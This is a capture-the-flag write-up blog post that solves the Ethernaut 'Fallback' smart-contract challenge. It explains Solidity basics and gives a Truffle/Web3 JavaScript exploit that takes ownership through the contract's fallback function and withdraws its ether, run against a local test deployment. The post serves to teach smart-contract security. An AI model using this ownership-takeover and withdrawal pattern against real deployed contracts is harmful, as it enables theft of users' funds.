Title: Solving Zeppelin's Ethernaut CTF - Fallback
Date: 2018-05-31 23:00
Tags: ethereum, solidity, ctf, smart contracts
Category: Ethereum
Slug: solving-zeppelin-ethernaut-ctf-fallback
Summary: Second post of a series in which we tackle the challenges in the [Ethernaut CTF by Zeppelin](https://ethernaut.zeppelin.solutions/){:target="_blank",:rel="noopener"}. In this article, after explaining the Solidity and Web3 basics by examples, we solve the first challenge: Fallback.

## Introduction
In this post, we are going to solve the first challenge in the Ethernaut CTF: **Fallback**. This challenge is closer to an introduction to 
experimenting with the platform and get comfortable with it than a real exploiting challenge, I know. Nevertheless, it's a good way to kickstart the CTF, and for us, to start digging into Solidity, Web3, Ethereum, and many other concepts.

First of all, go to [the Fallback page](https://ethernaut.zeppelin.solutions/level/0x234094aac85628444a82dae0396c680974260be7){:target="_blank",:rel="noopener"} and read the challenge, even though you may not understand a thing of what it says at first. At the bottom, there's the Smart Contract code, written in Solidity. Check it out too, don't be lazy. At least try to grasp what the contract is supposed to accomplish by reading the function names.

Ready? Ok, let's break it down.

## Solidity 101
### Pragma solidity
~~~solidity
pragma solidity ^0.4.18;
~~~

You better get used to this line of code, because you will see that A LOT. Like, always. It is the way to declare what is the **minimum version of the Solidity compiler required** to compile the contract's source code. 

In this case the line would mean: 'Hey, compile this Solidity code with **at least** a 0.4.18 compiler, because otherwise, your compiler may not understand some things about the source code'. Another thing to note here: **semicolons**. Yes, they're mandatory.

### Imports
~~~solidity
/* Fallback.sol */

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
~~~
Not so much to say about this line for now. It imports an existing contract called `Ownable.sol` to be used later as a base contract for the Fallback contract (contracts can inherit from others).

### Declaring a ~~class~~ contract
~~~solidity
/* Fallback.sol */

contract Fallback is Ownable { ... }
~~~
If you ever declared a class in some other programming language, this should sound familiar. In Solidity, we call them **contracts**. Like a class, a contract can inherit from other(s). That can be done using the keyword `is`.

Our contract, Fallback, inherits the attributes and functions from Ownable. Bear in mind that Solidity supports multiple inheritance, and that **the order in which you write the 'parent' contracts matters** (but that is a whole other story that you should not worry about, at least for now).

### Ownable
But, the fuck is Ownable ?. Well, go and check out the code for yourself at [Zeppelin's repo](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol). As the docs say, it main goal is to simplify the tasks related to user authorization. 

Any contract that inherits from Ownable will have an [owner address](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/746673a94f7e43835fcb5cb7b1af8ff1eea4e276/contracts/ownership/Ownable.sol#L10) with the necessary permissions to execute some of the contract's functions, preventing any other account from calling them. Those functions *must* be labeled with the modifier [onlyOwner](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/746673a94f7e43835fcb5cb7b1af8ff1eea4e276/contracts/ownership/Ownable.sol#L31).

In Fallback, the `onlyOwner` modifier is used in the `withdraw` function:
~~~solidity
/* Fallback.sol */

function withdraw() public onlyOwner {
    owner.transfer(this.balance);
}
~~~

Back with Ownable, looking at [the constructor function](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/746673a94f7e43835fcb5cb7b1af8ff1eea4e276/contracts/ownership/Ownable.sol#L25) (which is executed only the first time the contract is deployed) the initial owner of the contract will be the account (`msg.sender`) that deploys the contract to the network.

The ownership can be transferred, though, by means of the [transferOwnership](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/746673a94f7e43835fcb5cb7b1af8ff1eea4e276/contracts/ownership/Ownable.sol#L40) and [renounceOwnership](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/746673a94f7e43835fcb5cb7b1af8ff1eea4e276/contracts/ownership/Ownable.sol#L49) functions.

Remember that all of this functions, variables and modifiers are available in the Fallback contract, since it inherits from Ownable.

### Declaring variables
~~~solidity
/* Fallback.sol */

mapping(address => uint) public contributions;
~~~

We have a [mapping](http://solidity.readthedocs.io/en/v0.4.21/types.html#mappings), something similar to a hash table, that associates each [address](http://solidity.readthedocs.io/en/v0.4.21/types.html#address) in it, with a [uint](http://solidity.readthedocs.io/en/v0.4.21/types.html#integers) number (`uint` and `uint256` are aliases).

The keyword [public](http://solidity.readthedocs.io/en/v0.4.21/contracts.html#visibility-and-getters) automatically creates a getter function for the variable.

If interested, you can [learn more about Solidity types here](http://solidity.readthedocs.io/en/v0.4.21/types.html#types)

### Constructors
~~~solidity
/* Fallback.sol */

function Fallback() public {
    // Initial contribution from the owner
    contributions[msg.sender] = 1000 * (1 ether);
}
~~~
Next, we find a pretty special function. The contract's constructor. How can I tell ?
Well, because it has **the *exact* same name as the contract**. Let me be clear, **EXACT SAME NAME**. Some bad things can happen if contract and constructor's names do not match.

In object-oriented programming world, a class' constructor is called when an instance of the class is created, right ?. Well, something similar here.

In the Ethereum and Solidity world, a contract's constructor is called when the contract is deployed to the network. That means that the constructor is called just **once**. In Fallback's case, by looking at its constructor function, it can be seen that an initial contribution of 1000 ETH from the owner is stored in the `contributions` mapping when the contract is deployed. The keyword `msg.sender` references the caller of the function - *which may or may not be the same as the EOA that originated the transaction (definitely not going down this rabbithole now)*. To keep things simple, let's take for granted that the contract was deployed by an EOA, so `msg.sender` references the address of that particular account.

### Functions
~~~solidity
/* Fallback.sol */

function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
~~~

This piece of code defines a function named `contribute` which takes zero arguments, is `public` and `payable`.

Let's start with the `public` keyword. In Solidity, there are four different 'levels' of visibility for functions. As a thorough description of each of them (public, external, internal, private) can be found [in the docs for visibility and getters](http://solidity.readthedocs.io/en/v0.4.21/contracts.html#visibility-and-getters), let's just state that because of the `public` modifier, the `contribute` function can be called, basically, from everywhere (inside and outside the contract where it is defined).

What about `payable`?. This keyword is used in all of those functions that are allowed to receive ether when they are called. The ether they receive is stored in the contract's balance (automatically), and the amount received can be referenced using the `msg.value` global variable. Bear in mind that this value is in Wei units, not Ether.

The first statement in the function's body, `require(msg.value < 0.001 ether);`, checks if `msg.value` is minor than a certain value. If it is not, the condition in the `require` function will be false and the function will throw an exception, causing the whole execution of the transaction to halt and revert. The `require` function is heavily used in Solidity, and it is used for checking conditions in user-controlled inputs (such as `msg.value`). If you want to assert a certain condition for an internal variable, it is recommended to use the `assert` function instead of `require`. [Here you can read more about Solidity's `require` and `assert`](https://media.consensys.net/when-to-use-revert-assert-and-require-in-solidity-61fb2c0e5a57).

The following lines are pretty straightforward, so not so much to highlight there. The value sent along with the transaction by the sender is stored as a contribution. If the sum of the contributions made by the sender are greater in value than those made by the current owner, **the sender becomes the new owner of the contract**. That seems a little difficult, though. As we saw in the contract's constructor, the owner initially makes a contribution of a thousand ethers. Let's keep exploring the rest of the contract's functions and see if we can find another way to become the owners without spending so much money in the process.

~~~solidity
/* Fallback.sol */

function getContribution() public view returns (uint) {
    return contributions[msg.sender];
}

function withdraw() public onlyOwner {
    owner.transfer(this.balance);
}  
~~~

`getContribution` allows the caller to just *see*, thus the `view` modifier, the total amount contributed by him/her. Note that in Solidity we have to explicitly specify what type of values a function returns (only if it actually *does* return a value). This is accomplished by means of the keyword `returns` followed by a list of one or more types (yeap, we can return multiple things from a single function).

Next, `withdraw`. Because of the `onlyOwner` modifier, it can only be called by the owner of the contract. That means that at any time, the owner of the contract can call this function and transfer to his/her address the whole balance of the contract. Neat, huh ?. Two details two highlight in here.

One, `this.balance` references the current balance (in Wei) of the contract - you can also see this as `address(this).balance`.

Two, all variables of type `address` have a `transfer` function that takes a single argument, and it is used to ... guess what ? *transfer*, a certain amount of Wei from the contract to that particular address. Other ways to transfer ether to `address`es involve the use of methods such as `send` and `call`, but beware! They behave differently than `transfer` and can trigger, specially `call`, some unexpected and interesting behaviours. I can assure you that we will definitely cover more on this in later articles, like, **a lot more**. Just be patient.

Finally, the Fallback contract ends with this strange, nameless, function:
~~~solidity
/* Fallback.sol */

function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
~~~

Weird, right?. Welcome to Solidity's **fallback functions** world.

### The fallback function

That is how this nameless payable functions are called in Solidity: fallback functions. Why fallback ? Well, because it is the contract's function the EVM will trigger when a transaction that does not include a function call is executed agains a contract. Let's try to make this clearer (Ethereum nazis please do not read the following paragraphs, you may not like them - at all).

As we already know, in Ethereum, you can send a transaction whether to an EOA or a contract. Transactions made to EOA's do not execute any EVM code (because EOA's do not have any code to be executed). However, contracts do have code, so transactions made to them *do* execute code. So far, so good.

In every Ethereum transaction, there's a field called 'data' (go and see it for yourself at [https://etherscan.io](https://etherscan.io)). When we send a transaction to a contract, and we want to execute some of its code, the 'data' field specifies the function to be executed with the necessary parameters, otherwise the little gnomes living inside the EVM would have no idea of what do we want to do with that contract. 

Now, what if we just want to send the contract some ether just like we do with a regular EOA? No functions, no arguments, which means an empty 'data' field in the transaction. When the gnomes open this transaction, they try to match the 'data' field to the functions defined in the contract. But as soon as the tiny creatures find out that the data field does not match to any function known in the contract, they just try to *fallback* to the fallback function, which can lead to two different outcomes:
- A. The fallback function **is defined**, so gnomes diligently take the value sent with the transaction, store it in the contract's balance, and then execute the function's code.
- B. The fallback function **is not defined**, so gnomes just do not know what the hell they should do and just halt and revert the whole thing, telling you to fuck off. True story.

Okey, back to Fallback's (the contract) fallback function. In it, we discover the easier way we were looking for to become the owners of the contract!. Anyone who has previously made a contribution and calls the function fallback afterwards (sending some aditional ethers), automatically becomes the new owner, therefore passing the challenge. At this point, I imagine you're as fed up with this whole Solidity theory as I am, so let's do it!.

## Deploying your first smart contract
After studying the whole Fallback contract code, we found a way to become the owners. Now, how do we do actually do it?.

Although the Zeppelin's guys provide us with an already set up interactive in-browser platform, I found it far more enriching to the learning process to set up my own local test environment using the tools we saw in the [first article](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-intro/). So that is what we are going to do.

First, in the `contracts` folder create a file called `Fallback.sol`. Within that file, paste the [source code of the Fallback contract](https://ethernaut.zeppelin.solutions/level/0x234094aac85628444a82dae0396c680974260be7). Save and close.

In the root directory of your project (at the same level as the `contracts` folder) create a new folder called `exploits`. Inside it, create a new file `fallback.exploit.js`.

Next, locate a file called `2_deploy_contracts.js` inside the `migrations` folder. Should the file not be there, create it. This file is used to tell Truffle which contracts are to be deployed to the network when the `truffle migrate` command is executed. As we want to deploy the `Fallback.sol` contract, let's include the following code:

~~~javascript
/* migrations/2_deploy_contracts.js */

let Fallback = artifacts.require('./Fallback.sol')
module.exports = deployer => {
     deployer.deploy(Fallback)
}
~~~

Even though the above code is enough for now, you should refer to [Truffle's docs on Migrations](http://truffleframework.com/docs/getting_started/migrations) to gain more insights about the deployment scripts and how to exactly configure and use them.

Ok, time to launch Ganache-cli! Fire up a new terminal and follow the instructions explained in the [introductory article](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-intro/). Once done, open another terminal and, being in the root folder of the project, run `truffle migrate`. If everything went well, the output should be similar to:

~~~
[...]
Running migration: 2_deploy_contracts.js
  Deploying Fallback...
  ... 0xd79a5f17584a8e914d14414198d729dd5cb7281cef5c2a2abc324fad04ae938c
  Fallback: 0x53ae8970e687a2c628f05d885dfae84f37a57a8b
Saving successful migration to network...
  ... 0x83a7c6062eec5c51f48d28f0224504564222fdb959db3b42dca019eb95bcca06
Saving artifacts...
[...]
~~~

Note that the message even includes the contract's address - 0x53ae8970e687a2c628f05d885dfae84f37a57a8b in this case.

Now that the contract has been deployed, it is time to start interacting with it.

## Enter Web3

Remeber how in the [introductory article](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-intro#summing-up) we launched the interactive development console of Truffle which let us 'talk' to our local blockchain ? You better forget about that useless piece of crap.

Just kidding (: - but we won't be using it for now. Instead, we will be using Truffle's `exec` command to launch our own external scripts to exploit the contracts vulnerabilities. These scripts will be written in JavaScript, using the de-facto standard [Web3 API](https://github.com/ethereum/web3.js/), which is already provided by Truffle as a global variable in our scripts as long as we launch them with `truffle exec <my-badass-script.js>` (so no need to `npm install` nor `require` anything, cool).

Create a new folder `exploits` in the root directory of the project and a Javascript file called `fallback.exploit.js` inside the folder. Now, let's write the exploit.

It was earlier mentioned that Truffle already provides some global variables in our scripts to make our lives easier, among them: `web3` and `artifacts`. The latter is used to 'require' contracts in our scripts, what allows us to easily interact with any contract - so that is what we do in our first line of code. I'm also importing the assert library (this is not mandatory - I just find it useful for debugging and avoiding an if-else hell).

~~~javascript
/* fallback.exploit.js */
const FallbackContract = artifacts.require('Fallback')
const assert = require('assert')
~~~

According to [Truffle's docs on external scripts](http://truffleframework.com/docs/getting_started/scripts#file-structure), we ought to export a function that takes a callback as an argument. Moreover, that callback needs to be executed at the end of the script, like this:

~~~ javascript
/* fallback.exploit.js */
const FallbackContract = artifacts.require('Fallback')
const assert = require('assert')

async function execute(callback) { 
    // [...]
    callback()
}

module.exports = execute
~~~

I know, nothing fancy yet. This is all Truffle-related stuff, let's call it the *structure* of our exploits. In fact, you'll see that we will always come back to this boilerplate in future tutorials, so keep it at hand. 

Let's go ahead and do something more interesting. Recall that, to solve Fallback, we need to do 3 simple tasks:

1. Make a contribution minor than 0.001 ether
2. Call the fallback function to become the owner
3. Withdraw!

## Exploiting the contract

~~~javascript
/* fallback.exploit.js */
const FallbackContract = artifacts.require('Fallback')
const assert = require('assert')

async function execute(callback) { 
    
    // Get attacker account
    let attacker = web3.eth.accounts[1]
    console.log(`Attacker address: ${attacker}`)

    // Instance vulnerable contract
    let contract = await FallbackContract.deployed()

    // Check who's the owner
    let contractOwner = await contract.owner.call()
    assert.equal(contractOwner, web3.eth.accounts[0])
    console.log(`Contract owner: ${contractOwner}`)

    // 1. Make a small contribution
    await contract.contribute({
        from: attacker,
        value: web3.toWei(0.0009, 'ether')
    })

    callback()
}

module.exports = execute
~~~

Since, by default, our contracts are deployed using the first account provided by Truffle (`web3.eth.accounts[0]`), we are going to suppose that `web3.eth.accounts[0]` is the *victim* account. Our *attacker* account will be, in most cases, `web3.eth.accounts[1]`.

In the script, once we find the attacker account, we then create an instance of an *already deployed* contract using the `deployed()` method. The instance, named `contract`, can be used to call all public functions defined in the Fallback contract's ABI, including the getters for the public variables. In particular, we are first calling the public getter of the `owner` variable by doing `contract.owner.call()` and after checking that the current owner is the victim address, we make the small contribution to the contract with `contract.contribute(...)`.

You might now be wondering why on earth we are passing an object as an argument to `contribute`, when it actually does not take any arguments at all (according to its definition in Fallback.sol). If you are not, well, you should.
The thing is, Truffle and Web3 do plenty *magic* stuff behind the scenes.
Thanks to Web3, there are [multiple ways in which you can call contract functions](https://github.com/ethereum/wiki/wiki/JavaScript-API#contract-methods):
1. `contract.methodName.call(...)`
2. `contract.methodName.sendTransaction(...)`
3. `contract.methodName(...)`

For simplicity, I tend to go with version 3 most of the times. The arguments passed to the function should start with those specific to the function (none in `contribute`), followed by a *transaction object* (the object we are passing to `contribute`) and a callback (I'm done with using callbacks, I rather async/await now).

Things to take into account regarding the [transaction object](https://github.com/ethereum/wiki/wiki/JavaScript-API#parameters-25):
- `from` defaults to `web3.eth.accounts[0]` if not explicitly defined
- `to` is not necessary when calling a contract's function
- `value` must be in Wei units, that is why we do `value: web3.toWei(...)`
Although these are the three attributes we will most often use, please remember that the others exist as well and might come in handy sometimes. When in doubt, always refer to the docs.

Time to reclaim what is ours! Let's become the owners of Fallback.
~~~javascript
/* fallback.exploit.js */

// 2. Call the fallback function to become the owner of the contract
await contract.sendTransaction({
    from: attacker,
    value: web3.toWei(0.00000001, 'ether')
})

// Check who's the owner now :)
contractOwner = await contract.owner.call()
assert.equal(contractOwner, attacker)
console.log(`Contract owner: ${contractOwner}`)
~~~

As we earlier saw in Fallback.sol, anyone who calls its fallback function becomes the owner of the contract. Quick reminder:
~~~solidity
/* Fallback.sol */
function() public payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
~~~

As in our exploit we're not calling any specific function, just sending a regular transaction to the contract with `contract.sendTransaction(...)`, the fallback's code is executed and we successfuly accomplish our objective. If the contract had any ether in it, we could now be able to withdraw all of it by simply doing:
~~~javascript
/* Fallback.exploit.js */

// 3. Withdraw all money
let response = await contract.withdraw({
    from: attacker
})
console.log(`Withdrew all money in transaction ${response.tx}`)
~~~

That's it!  You can now run `truffle exec exploits/fallback.exploit.js` to execute the exploit and pass the challenge.

Find the entire [exploit code of the Fallback contract at my GitHub repo](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/fallback.exploit.js).


If you enjoyed this first challenge, stay tuned! In the next post we will be tackling the next one: [Fallout](https://ethernaut.zeppelin.solutions/level/0x220beee334f1c1f8078352d88bcc4e6165b792f6).
